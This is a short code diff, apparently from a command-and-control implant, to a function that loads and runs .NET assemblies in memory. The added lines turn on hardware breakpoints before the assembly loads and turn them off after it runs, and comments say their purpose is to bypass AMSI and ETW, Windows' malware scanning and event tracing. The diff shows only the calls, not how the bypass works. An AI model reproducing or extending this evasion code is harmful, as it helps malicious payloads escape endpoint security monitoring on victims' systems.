@@ -117,6 +117,13 @@ auto DECLFN Dotnet::Inline(
     Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );
 
     //
+    // active hwbp to bypass amsi/etw
+    //
+    if ( Self->Hw->DotnetBypass ) {
+        Self->Hw->DotnetInit();
+    }
+
+    //
     // load the dotnet
     //
     HResult = AppDom->Load_3( SafeAsm, &Assembly );
@@ -187,6 +194,13 @@ auto DECLFN Dotnet::Inline(
     //
     HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, nullptr );
     if ( HResult ) goto _KH_END;
+
+    //
+    // desactive hwbp to bypass amsi/etw
+    //
+    if ( Self->Hw->DotnetBypass ) {
+        Self->Hw->DotnetExit();
+    }
 
     //
     // allocate memory to output buffer
